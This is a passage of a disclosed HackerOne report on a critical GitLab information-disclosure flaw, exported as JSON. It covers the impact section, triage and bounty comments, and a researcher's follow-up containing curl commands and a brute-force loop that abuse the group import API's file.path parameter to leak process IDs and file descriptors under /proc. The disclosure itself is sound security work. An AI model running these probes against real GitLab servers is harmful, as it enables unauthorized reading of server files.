information\nVersion:    12.9.3-ee\nRevision:   7c13691fb8e\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 10.12\nURL:        http://gitlab-vm.local\nHTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    12.0.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eread known files in \u003ccode\u003e::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, \u0026#39;public/uploads/tmp\u0026#39;)\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eread unknown inflight files by using the symlinks in \u003ccode\u003e/proc/PID/fd/XX\u003c/code\u003e belonging to other users.\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"10000.0","formatted_bounty":"$10,000","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":385,"voters":["jazz______","sky003","trojan187","r4d1kal","rik","a_d_a_m","mashoud1122","vapour","bl4de","base_64","and 375 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":39022,"asset_type":"OTHER","asset_identifier":"Your Own GitLab Instance","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7673372,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We will investigate the issue as soon as possible.\u003cbr\u003e\nDue to our current workload, we will get back within 20 business days with an update.\u003c/p\u003e\n\n\u003cp\u003ePlease refrain from submitting your report or inquiring about its status through\u003cbr\u003e\nadditional channels, as this unnecessarily binds resources in the security team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-04-15T15:05:53.008Z","updated_at":"2020-04-15T15:05:53.008Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7682679,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Removed","markdown_message":"\u003cp\u003eRemoved\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-16T09:47:51.833Z","updated_at":"2020-04-16T09:48:12.088Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7683168,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @vakzz,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/214636.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nSecurity Team | GitLab Inc.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report.\u003c/p\u003e\n\n\u003cp\u003eWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab/-/issues/214636\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab%2F-%2Fissues%2F214636\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab/-/issues/214636\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.  This issue will be made public 30 days following the release of a patch.\u003c/p\u003e\n\n\u003cp\u003eGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\u003c/p\u003e\n\n\u003cp\u003eWe will continue to update you via HackerOne as a patch is scheduled for release.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-16T10:15:25.221Z","updated_at":"2020-04-16T10:15:25.221Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7683183,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-16T10:16:52.125Z","updated_at":"2020-04-16T10:16:52.125Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7881648,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jmatos_bgtvf,\n\nJust a quick update on some other findings that could effect this issue. Instead of iterating through all the numbers to find a valid pid, it can be found using an info leak in the group import API:\n\n```bash\ncurl -H \"Authorization: Bearer $TOKEN_R\" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4\u0026name=group4\u0026file.path=/proc/self'\n{\"message\":\"insecure path used '/proc/9348'\"}\n```\n\nThis could also be used to try and determine the next valid file descriptor:\n```\nwhile true; do curl -H \"Authorization: Bearer $TOKEN_R\" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4\u0026name=group4\u0026file.path=/proc/9348/fd/145' ; done\n\n{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"500 Internal Server Error\"}{\"message\":\"insecure path used '/var/log/gitlab/gitlab-rails/database_load_balancing.log'\"}\n```  \n\nAlso I see this has been fixed in v12.10.2, had a look and could not see any bypasses. I like how the path from the jwt token is now being used where possible, should help prevent this type of attack.\n\nCheers,\nWill","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jmatos_bgtvf\"\u003e@jmatos_bgtvf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eJust a quick update on some other findings that could effect this issue. Instead of iterating through all the numbers to find a valid pid, it can be found using an info leak in the group import API:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Authorization: Bearer \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TOKEN_R\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-F\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;lala=@/tmp/lala.txt\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;https://gitlab.com/api/v4/groups/import?path=group4\u0026amp;name=group4\u0026amp;file.path=/proc/self\u0026#39;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;insecure path used \u0026#39;/proc/9348\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis could also be used to try and determine the next valid file descriptor:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ewhile true; do curl -H \u0026quot;Authorization: Bearer $TOKEN_R\u0026quot; -F \u0026#39;lala=@/tmp/lala.txt\u0026#39; \u0026#39;https://gitlab.com/api/v4/groups/import?path=group4\u0026amp;name=group4\u0026amp;file.path=/proc/9348/fd/145\u0026#39; ; done\n\n{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;500 Internal Server Error\u0026quot;}{\u0026quot;message\u0026quot;:\u0026quot;insecure path used \u0026#39;/var/log/gitlab/gitlab-rails/database_load_balancing.log\u0026#39;\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlso I see this has been fixed in v12.10.2, had a look and could not see any bypasses. I like how the path from the jwt token is now being used where possible, should help prevent this type of attack.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-04T01:36:01.412Z","updated_at":"2020-05-04T01:36:01.412Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7886365,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @vakzz ,\n\nThanks for your update, I'm forwarding it to our engineering team.\n\nBest regards,\nVitor\nSecurity Team | GitLab Inc.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThanks for your update, I\u0026#39;m forwarding it to our engineering team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nVitor\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-04T11:24:54.901Z","updated_at":"2020-05-04T11:24:54.901Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7943034,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jmatos_bgtvf (and @vdesousa),\n\nJust checking in, I think this was resolved in the last security release or is it waiting for https://gitlab.com/gitlab-org/gitlab-workhorse/-/issues/261?\n\nCheers,\nWill","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jmatos_bgtvf\"\u003e@jmatos_bgtvf\u003c/a\u003e (and \u003ca href=\"/vdesousa\"\u003e@vdesousa\u003c/a\u003e),\u003c/p\u003e\n\n\u003cp\u003eJust checking in, I think this was resolved in the last security release or is it waiting for \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-workhorse/-/issues/261\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-workhorse%2F-%2Fissues%2F261\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-workhorse/-/issues/261\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-09T00:49:16.188Z","updated_at":"2020-05-09T00:49:16.188Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7970639,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @vakzz ,\n\nThank you again for the report! Your finding has been indeed patched in GitLab version [12.10.2](https://about.gitlab.com/releases/2020/04/30/security-release-12-10-2-released/) and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nVitor\nSecurity Team | GitLab Inc.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been indeed patched in GitLab version \u003ca href=\"/redirect?url=https%3A%2F%2Fabout.gitlab.com%2Freleases%2F2020%2F04%2F30%2Fsecurity-release-12-10-2-released%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e12.10.2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and we are awarding a bounty. Congratulations!\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nVitor\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-12T06:32:48.883Z","updated_at":"2020-05-12T06:32:48.883Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"9000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7970640,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-12T06:33:05.103Z","updated_at":"2020-05-12T06:33:05.103Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"vakzz","url":"/vakzz"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8222131,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-07T01:28:28.635Z","updated_at":"2020-06-07T01:28:28.635Z","first_to_agree":true,"actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8226958,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T04:57:08.827Z","updated_at":"2020-06-08T04:57:08.827Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8226959,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T04:57:08.919Z","updated_at":"2020-06-08T04:57:08.919Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}